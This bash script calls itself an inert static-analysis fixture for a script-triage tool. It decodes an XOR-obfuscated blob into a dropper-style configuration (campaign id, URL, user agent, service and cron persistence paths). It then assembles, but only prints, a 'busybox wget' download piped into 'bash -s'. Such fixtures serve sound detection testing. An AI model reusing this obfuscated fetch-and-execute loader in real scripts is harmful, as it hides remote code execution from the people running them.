#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_7626fe7a='107,94,202,238,134,105,10,153,238,215,114,13,205,199,197,46,10,222,255,216,40,39,145,255,216,56,8,205,212,196,56,28,217,247,222,46,65,154,188,129,110,9,158,232,212,114,11,197,231,215,43,1,197,165,211,49,31,193,234,206,56,65,154,186,208,56,95,152,238,131,56,14,131,164,140,46,31,216,255,222,96,3,222,254,202,107,94,202,238,134,105,10,153,238,215,112,1,203,226,215,45,2,205,232,139,57,6,243,229,209,52,14,220,230,215,62,19,157,182,194,51,26,195,232,233,56,8,205,255,197,33,27,217,228,210,41,28,243,255,211,58,24,243,243,217,63,22,223,254,212,96,29,201,255,198,60,11,205,247,211,45,6,220,212,222,62,27,205,251,197,52,11,128,238,194,50,2,201,249,233,56,29,197,254,199,62,14,145,248,198,56,27,223,247,135,96,25'
readonly Codec_7626fe7a='reversed_decimal|repeating_key_xor|6f,5d,b6,8b,ac'

Load_7626fe7a() {
  e=()
  local IFS=',' i
  local -a pieces
  read -r -a pieces <<< "${Material_7626fe7a}"
  for ((i=${#pieces[@]}-1; i>=0; i--)); do e+=("${pieces[i]}"); done
}

Decode_7626fe7a() {
  d=()
  local -a key_bytes=(111 93 182 139 172)
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("$((e[i] ^ key_bytes[i % ${#key_bytes[@]}]))")
  done
}

Recover_7626fe7a() {
  local -a e d
  local t n z i
  n="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_7626fe7a
  case 1 in 1) Decode_7626fe7a ;; *) return 70 ;; esac
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_7626fe7a() { local recovered; recovered="$(Recover_7626fe7a)"; printf '%s\n' "$recovered"; }

Plan_7626fe7a() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_7626fe7a)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(busybox wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_7626fe7a; fi
